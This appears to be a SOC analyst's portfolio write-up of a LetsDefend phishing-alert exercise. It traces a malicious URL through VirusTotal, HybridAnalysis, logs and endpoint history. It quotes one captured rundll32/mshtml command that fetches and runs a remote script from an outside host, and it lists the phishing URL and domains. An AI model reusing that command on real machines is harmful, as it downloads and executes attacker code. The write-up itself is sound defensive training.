***
# Phishing URL Detected

## Summary
Investigated a high-severity phishing alert involving a suspicious URL sent to an internal user. Cross-referenced the destination domain's reputation, validated the URL as malicious using two independent sandboxes, and traced the request's delivery path through log and endpoint data to confirm execution had occurred on the destination machine. The alert was closed as a true positive, with evidence of active compromise on the affected host.

## Alert Details
| SEVERITY | DATE | SMTP ADDRESS | SOURCE HOST | DEST. HOST |
| --- | --- | --- | --- | --- |
| High | Mar, 22, 2021 | 172.16.17.49 | ellie@letsdefend.io | mogagrocol.ru |

## Investigation Process
### 1. Initial Triage - Identifying "red flags"

First, VirusTotal is used to obtain a domain health report of the destination hostname *mogagrocol.ru*.<br><br>
<img width="1544" height="727" alt="image" src="https://github.com/user-attachments/assets/f233485f-83da-4bda-bff2-8761a88dde3c" />
<br><br>

       VirusTotal delivered a Domain Health Report suggesting:
               - 10/91 Vendors flagged as Malicious/Phishing
               - 2/91 Vendors flagged as Suspicious
<br>

This gives strong reason to warrant suspicion before any further analysis.

### 2. Request URL Analysis - Utilizing VirusTotal & HybridAnalysis

URL *http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io* was analyzed by third-party sandboxes VirusTotal and HybridAnalysis.<br><br>

<img width="1372" height="709" alt="image" src="https://github.com/user-attachments/assets/01669f9d-326f-480d-9338-140699710b95" />
<br><br>

      VirusTotal flagged the URL as malicious (13/92 vendors).

<br><br>

<img width="1028" height="703" alt="image" src="https://github.com/user-attachments/assets/2a0275a4-14c6-453f-bd52-02400f0c7f7d" />
<br>
<img width="1034" height="697" alt="image" src="https://github.com/user-attachments/assets/a2986ece-07c9-4a57-9610-3617cb6dd3c8" />
<br><br>

      HybridAnalysis also flagged the URL as malicious, with:
               - Threat Score of 100/100
               - Falcon Sandbox Reports of 4/6 as malicious, and 2/6 as suspicious
<br>

Both third-party sandboxes independently identified the URL as malicious.

### 3. Log Management - Tracing the delivery path

Log management was conducted on source address *172.16.17.49* to find the destination address and port number.<br><br>

<img width="1545" height="606" alt="image" src="https://github.com/user-attachments/assets/ed7eaabf-6a8d-4bf0-8256-41da973240c5" />
<br><br>

      The destination address was 67.68.210.95 and port number was 80.
<br>

### 4. Endpoint Verification - Execution check

Endpoint Security was used from destination IP 67.68.210.95 to identify the destination machine and terminal history.<br><br>

<img width="1319" height="435" alt="image" src="https://github.com/user-attachments/assets/f9f950c1-34e4-484f-a3fb-3e6e31696f3a" />
<br>
<img width="1455" height="522" alt="image" src="https://github.com/user-attachments/assets/127397bf-4ab5-41e3-857a-f08094904d30" />
<br><br>

      The destination machine was EmilyComp.
      Suspicious terminal history was found at 14.02.2021 12:12, with command line:
         rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'
      This indicates a remote script execution attempt, consistent with an active compromise.
<br>

## Findings
The alert was confirmed as a **true positive**. The URL was independently flagged as malicious by both VirusTotal and HybridAnalysis, with HybridAnalysis returning a maximum threat score of 100/100. Endpoint analysis revealed suspicious terminal activity on EmilyComp consistent with an active compromise, indicating the URL was accessed and a remote payload was executed before containment.

## Skills Demonstrated
- Phishing URL investigation
- Log analysis
- Endpoint investigation
- URL Analysis (VirusTotal, HybridAnalysis)

## Practice Project Source
[SOC141 - Phishing URL Detected | LetsDefend](https://app.letsdefend.io/monitoring?channel=investigation&event_id=86)

***
